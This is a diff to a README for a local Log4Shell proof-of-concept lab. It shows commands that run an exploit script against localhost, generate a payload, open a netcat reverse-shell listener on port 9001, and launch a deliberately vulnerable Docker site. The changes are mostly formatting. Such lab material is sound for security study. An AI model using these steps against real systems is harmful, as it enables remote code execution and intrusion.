@@ -80,9 +80,11 @@ Run the payload generator to generate payload script
 echo "site runs at port 8080"
 cd ~/mylog4j/log4j-shell-poc
 python3 poc.py --userip localhost --webport 8000 --lport 9001
-chmod +x generatelog4jpayload.sh
-./generatelog4jpayload.sh
 ```
+## Run log4j payload generator
+- chmod +x generatelog4jpayload.sh
+- ./generatelog4jpayload.sh
+
 Where generatelog4jpayload.sh is the name of the script above.
 
 ### Start reverse shell listerner
@@ -95,12 +97,7 @@ nc -lvnp 9001
 cd ~/mylog4j/log4j-shell-poc
 docker build -t log4j-shell-poc .
 ```
-Run 
-```
-sudo docker build -t log4j-shell-poc .
-if you have not restarted you machine after docker installation
-```
-### Run docker website
+### Run log4j vulnerable website
 ```
 docker run --network host log4j-shell-poc
 ```
